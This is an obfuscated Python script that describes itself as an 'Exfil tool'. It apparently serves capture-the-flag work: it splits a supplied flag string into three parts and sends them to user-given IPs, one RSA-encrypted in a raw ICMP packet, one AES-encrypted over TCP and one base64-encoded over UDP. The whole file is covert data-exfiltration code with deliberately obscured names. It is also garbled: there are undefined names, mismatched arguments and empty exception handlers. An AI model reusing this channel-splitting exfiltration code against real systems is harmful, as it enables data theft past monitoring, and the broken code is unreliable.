lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll, lllllllllllIllI, lllllllllllIlIl, lllllllllllIlII = Exception, int, open, min, bool, len, __name__, sum, print, range, str, bytes

from base64 import b64encode as IllIIllIIIlIlI
from struct import pack as lIlIIllllIlIll, unpack as llIllIllIIIlIl
from argparse import ArgumentParser as lIlIlllllIllll
from os import makedirs as lIlIIlIIllIIll, urandom as IlIllIIlllIIIl
from os.path import join as IIIIIIlIIlllIl
from socket import AF_INET as lIllIIIIIllIll, SOCK_DGRAM as lllllIIIlllIIl, SOCK_RAW as IlllllIlIlIllI, IPPROTO_ICMP as lIllIllIlIlIII, SOCK_STREAM as IlIIllIIIlIIIl, socket as IIllIIlIIIlllI
from cryptography.hazmat.primitives.asymmetric import rsa as IIllIIllIIlllI, padding as IllIllIIIIIIIl
from cryptography.hazmat.primitives import serialization as IIIIlIIlIIlIll, hashes as IlIlllIlIlIIll
from cryptography.hazmat.primitives.ciphers import Cipher as IIIlIllIIllIII, algorithms as IIllllIIlIllII, modes as IIIIIlIllIIllI
from cryptography.hazmat.primitives import padding as sympadding
from cryptography.hazmat.backends import default_backend as IlllllllIIlIlI
from math import ceil as IIIllIlIIIIlll

def llIIIlIIIlIlIlIIll(IIlIlIlllllIIIIlll, llllIlllIIIlllIllI='id_rsa_priv.xml', lIlllIIlIlllllIlIl='id_rsa_pub.xml'):
    lIlIlIllIllIIIIllI = IIlIlIlllllIIIIlll.private_numbers()
    IIlIllIIIIllIIIIIl = lIlIlIllIllIIIIllI.public_numbers

    def lIllIIllIIIIIllIII(lllllIIIlIIlIIllII):
        IlllIlllIIlllIIlIl = lllllIIIlIIlIIllII.to_bytes((lllllIIIlIIlIIllII.bit_length() + 7) // 8 or 1, 'big')
        return IllIIllIIIlIlI(IlllIlllIIlllIIlIl).decode('ascii')
    IIIllIllIIlllIlIll = '<RSAKeyValue>'
    IIIllIllIIlllIlIll += f'<Modulus>{lIllIIllIIIIIllIII(IIlIllIIIIllIIIIIl.n)}</Modulus>'
    IIIllIllIIlllIlIll += f'<Exponent>{lIllIIllIIIIIllIII(IIlIllIIIIllIIIIIl.lllIIIIIIlIllIlIII)}</Exponent>'
    IIIllIllIIlllIlIll += f'<P>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.IIIIllIlIllIlllIll)}</P>'
    IIIllIllIIlllIlIll += f'<Q>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.q)}</Q>'
    IIIllIllIIlllIlIll += f'<DP>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.dmp1)}</DP>'
    IIIllIllIIlllIlIll += f'<DQ>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.dmq1)}</DQ>'
    IIIllIllIIlllIlIll += f'<InverseQ>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.iqmp)}</InverseQ>'
    IIIllIllIIlllIlIll += f'<D>{lIllIIllIIIIIllIII(lIlIlIllIllIIIIllI.d)}</D>'
    IIIllIllIIlllIlIll += '</RSAKeyValue>'
    IllIIIlIlIllIIIIII = '<RSAKeyValue>'
    IllIIIlIlIllIIIIII += f'<Modulus>{lIllIIllIIIIIllIII(IIlIllIIIIllIIIIIl.n)}</Modulus>'
    IllIIIlIlIllIIIIII += f'<Exponent>{lIllIIllIIIIIllIII(IIlIllIIIIllIIIIIl.lllIIIIIIlIllIlIII)}</Exponent>'
    IllIIIlIlIllIIIIII += '</RSAKeyValue>'
    with lllllllllllllIl(llllIlllIIIlllIllI, 'w') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IIIllIllIIlllIlIll)
    with lllllllllllllIl(lIlllIIlIlllllIlIl, 'w') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IllIIIlIlIllIIIIII)

def llIIIIIllIIIlIIIIl(IlIIlIllllIlIlIllI: lllllllllllIlII, lIIIIlIIIIllIIIlII: llllllllllllllI=4660, IllIIIllllIlIIIlll: llllllllllllllI=1) -> lllllllllllIlII:
    lIIIIlIllllIllllII = lIlIIllllIlIll('!BBHHH', 8, 0, 0, lIIIIlIIIIllIIIlII, IllIIIllllIlIIIlll)
    IlIIlIllIlIIIIIIlI = lIIIIlIllllIllllII + IlIIlIllllIlIlIllI
    IIIllllllIIlllIllI = IIlIIlIIllIlIIlIll(IlIIlIllIlIIIIIIlI)
    IIIlIlIIllIlllIIlI = lIlIIllllIlIll('!BBHHH', 8, 0, IIIllllllIIlllIllI, lIIIIlIIIIllIIIlII, IllIIIllllIlIIIlll)
    return IIIlIlIIllIlllIIlI + IlIIlIllllIlIlIllI

def IIlIIlIIllIlIIlIll(IlIlIIlllllllIlIII: lllllllllllIlII) -> llllllllllllllI:
    if llllllllllllIlI(IlIlIIlllllllIlIII) % 2:
        IlIlIIlllllllIlIII = IlIlIIlllllllIlIII + b'\x00'
    IIllIIllllIlIlIIII = llllllllllllIII(llIllIllIIIlIl('!%dH' % (llllllllllllIlI(IlIlIIlllllllIlIII) // 2), IlIlIIlllllllIlIII))
    IIllIIllllIlIlIIII = (IIllIIllllIlIlIIII & 65535) + (IIllIIllllIlIlIIII >> 16)
    IIllIIllllIlIlIIII = (IIllIIllllIlIlIIII & 65535) + (IIllIIllllIlIlIIII >> 16)
    return ~IIllIIllllIlIlIIII & 65535

def IlllIIlIlIlllIlIII(lllIllllIIIlIIIIIl: lllllllllllIlIl):
    lllIlIlIlIllIIlIlI = llllllllllllIlI(lllIllllIIIlIIIIIl)
    IlIlllIlIllIllIIlI = IIIllIlIIIIlll(lllIlIlIlIllIIlIlI / 3)
    IllllIlIIlIIIIlllI = []
    for lllIlIIlIlIIlIIlII in lllllllllllIllI(3):
        IlIllIllllIllllIlI = lllIlIIlIlIIlIIlII * IlIlllIlIllIllIIlI
        if IlIllIllllIllllIlI >= lllIlIlIlIllIIlIlI:
            IllllIlIIlIIIIlllI.append('')
        else:
            IllllIlIIlIIIIlllI.append(lllIllllIIIlIIIIIl[IlIllIllllIllllIlI:IlIllIllllIllllIlI + lllllllllllllII(IlIlllIlIllIllIIlI, lllIlIlIlIllIIlIlI - IlIllIllllIllllIlI)])
    return IllllIlIIlIIIIlllI

def llIIIIIIlIIllIlIIl():
    IIIIllIlIllIlllIll = lIlIlllllIllll(description='Exfil tool (Python) - RSA(ICMP) + AES(TCP) + B64(UDP)')
    IIIIllIlIllIlllIll.add_argument('--flag', required=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), help='Flag string to exfiltrate')
    IIIIllIlIllIlllIll.add_argument('--icmp', required=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), help='ICMP destination IP')
    IIIIllIlIllIlllIll.add_argument('--tcp', required=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), help='TCP destination IP')
    IIIIllIlIllIlllIll.add_argument('--tcp-port', type=llllllllllllllI, default=4445, help='TCP destination port')
    IIIIllIlIllIlllIll.add_argument('--udp', required=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), help='UDP destination IP')
    IIIIllIlIllIlllIll.add_argument('--udp-port', type=llllllllllllllI, default=4444, help='UDP destination port')
    IIIIllIlIllIlllIll.add_argument('--out-dir', default='.', help='Directory to write keys (default cwd)')
    IlIllIIlIIIlIlIllI = IIIIllIlIllIlllIll.parse_args()
    lIlIIlIIlIIIlIlIll = IlIllIIlIIIlIlIllI.out_dir
    lIlIIlIIllIIll(lIlIIlIIlIIIlIlIll, exist_ok=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    IlIllIllIIIlIIllII = IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'id_rsa_priv.xml')
    IIIlIllllIllIIIlIl = IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'id_rsa_pub.xml')
    IllIlIllIIIlIIIllI = IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'aescache.bin')
    IIlIlIlllllIIIIlll = IIllIIllIIlllI.generate_private_key(public_exponent=65537, key_size=2048, backend=IlllllllIIlIlI())
    llIIIlIIIlIlIlIIll(IIlIlIlllllIIIIlll, priv_path=IlIllIllIIIlIIllII, pub_path=IIIlIllllIllIIIlIl)
    IllIlllIllIIlIIIII = IIlIlIlllllIIIIlll.private_bytes(encoding=IIIIlIIlIIlIll.Encoding.PEM, format=IIIIlIIlIIlIll.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=IIIIlIIlIIlIll.NoEncryption())
    IlllIIllllllIIIlIl = IIlIlIlllllIIIIlll.public_key().public_bytes(encoding=IIIIlIIlIIlIll.Encoding.PEM, format=IIIIlIIlIIlIll.PublicFormat.SubjectPublicKeyInfo)
    with lllllllllllllIl(IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'id_rsa_priv.pem'), 'wb') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IllIlllIllIIlIIIII)
    with lllllllllllllIl(IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'id_rsa_pub.pem'), 'wb') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IlllIIllllllIIIlIl)
    from cryptography.hazmat.primitives import keywrap as lIIlllllIllIll
    from cryptography.hazmat.primitives import constant_time as lllIIIIllIllll
    IIIlIlIIIlIIIIlIll = IlIllIIlllIIIl(32)
    IlIIlIlllIlIIllIlI = IlIllIIlllIIIl(16)
    with lllllllllllllIl(IllIlIllIIIlIIIllI, 'wb') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(lIlIIllllIlIll('<I', llllllllllllIlI(IIIlIlIIIlIIIIlIll)))
        IlIIIllllIlIIlllll.write(IIIlIlIIIlIIIIlIll)
        IlIIIllllIlIIlllll.write(lIlIIllllIlIll('<I', llllllllllllIlI(IlIIlIlllIlIIllIlI)))
        IlIIIllllIlIIlllll.write(IlIIlIlllIlIIllIlI)
    IllllIlIIlIIIIlllI = IlllIIlIlIlllIlIII(IlIllIIlIIIlIlIllI.lllIllllIIIlIIIIIl)
    lllIIllIlllIlIllll = IIlIlIlllllIIIIlll.public_key()
    IlIlIlllllIIIlllII = IllllIlIIlIIIIlllI[0].encode('utf-8')
    IllIlIlllIIIllllIl = lllIIllIlllIlIllll.encrypt(IlIlIlllllIIIlllII, IIlllIIlllllII.PKCS1v15())
    lIlIlIIIIIllIlIIll = IllllIlIIlIIIIlllI[1].encode('utf-8')
    lllllIIllIlIllllIl = IIlllIIlllllII.PKCS7(128).lllllIIllIlIllllIl()
    lIIIIlIllllIlIlllI = lllllIIllIlIllllIl.update(lIlIlIIIIIllIlIIll) + lllllIIllIlIllllIl.finalize()
    lIIIlIIIIlllllllll = IIIlIllIIllIII(IIllllIIlIllII.AES(IIIlIlIIIlIIIIlIll), IIIIIlIllIIllI.CBC(IlIIlIlllIlIIllIlI), backend=IlllllllIIlIlI())
    lIIIlIIIlIIlIIllII = lIIIlIIIIlllllllll.lIIIlIIIlIIlIIllII()
    lIlIlllIlllIlIllIl = lIIIlIIIlIIlIIllII.update(lIIIIlIllllIlIlllI) + lIIIlIIIlIIlIIllII.finalize()
    IIlIlIIIIllIIlllII = IllIIllIIIlIlI(IllllIlIIlIIIIlllI[2].encode('utf-8')).decode('ascii')
    IIlIlIIIllIlIIlllI = b''
    lIlllIIIllIlIIIlII = b''
    IIlIIllllllIllllIl = ''
    IIIIIIIIIllIlIIIIl = IIlIlIIIllIlIIlllI + IllIlIlllIIIllllIl
    lIIIIIllIllIIIIIIl = lIlllIIIllIlIIIlII + lIlIlllIlllIlIllIl
    lIIlIllllllIlIIlll = (IIlIIllllllIllllIl + IIlIlIIIIllIIlllII).encode('ascii')
    with lllllllllllllIl(IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'part1.enc'), 'wb') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IllIlIlllIIIllllIl)
    with lllllllllllllIl(IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'part2.enc'), 'wb') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(lIlIlllIlllIlIllIl)
    with lllllllllllllIl(IIIIIIlIIlllIl(lIlIIlIIlIIIlIlIll, 'part3.b64'), 'w') as IlIIIllllIlIIlllll:
        IlIIIllllIlIIlllll.write(IIlIlIIIIllIIlllII)
    try:
        IIllIIIllIllllIlIl = IIllIIlIIIlllI(lIllIIIIIllIll, IlllllIlIlIllI, lIllIllIlIlIII)
        IlIIlIIlIIIIlllIlI = llIIIIIllIIIlIIIIl(IIIIIIIIIllIlIIIIl, ident=43681, seq=1)
        IIllIIIllIllllIlIl.sendto(IlIIlIIlIIIIlllIlI, (IlIllIIlIIIlIlIllI.icmp, 0))
        IIllIIIllIllllIlIl.close()
    except lllllllllllllll as lllIIIIIIlIllIlIII:
    try:
        lIlIIllIIIIIlIIlll = IIllIIlIIIlllI(lIllIIIIIllIll, IlIIllIIIlIIIl)
        lIlIIllIIIIIlIIlll.settimeout(5)
        lIlIIllIIIIIlIIlll.connect((IlIllIIlIIIlIlIllI.tcp, IlIllIIlIIIlIlIllI.tcp_port))
        lIlIIllIIIIIlIIlll.sendall(lIIIIIllIllIIIIIIl)
        lIlIIllIIIIIlIIlll.close()
    except lllllllllllllll as lllIIIIIIlIllIlIII:
    try:
        IIllIIllllIlIlIIlI = IIllIIlIIIlllI(lIllIIIIIllIll, lllllIIIlllIIl)
        IIllIIllllIlIlIIlI.sendto(lIIlIllllllIlIIlll, (IlIllIIlIIIlIlIllI.udp, IlIllIIlIIIlIlIllI.udp_port))
        IIllIIllllIlIlIIlI.close()
    except lllllllllllllll as lllIIIIIIlIllIlIII:
if llllllllllllIIl == '__main__':
    llIIIIIIlIIllIlIIl()